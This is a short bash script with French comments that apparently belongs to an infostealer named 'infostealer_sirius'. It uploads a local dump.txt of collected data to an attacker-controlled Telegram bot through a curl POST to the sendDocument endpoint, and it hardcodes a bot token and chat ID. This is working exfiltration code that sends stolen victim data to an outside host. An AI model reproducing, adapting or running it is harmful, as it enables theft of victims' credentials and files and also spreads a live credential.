#!/bin/bash

# ⚠️ Remplace par ton token et chat ID
TOKEN="8166346967:AAEwOQI6ZTwWmCetx3JnAWFpsMAom0QO1jU"
CHAT_ID="8180943947"
DUMP_PATH="$(dirname "$0")/../dump.txt"  # 🔥 chemin dynamique basé sur le script

if [ -f "$DUMP_PATH" ]; then
    curl -s -X POST https://api.telegram.org/bot$TOKEN/sendDocument \
        -F chat_id=$CHAT_ID \
        -F document=@"$DUMP_PATH" \
        -F caption="Données collectées depuis infostealer_sirius"
    echo "[✓] Fichier $DUMP_PATH envoyé à Telegram"
else
    echo "[!] Fichier $DUMP_PATH introuvable"
fi

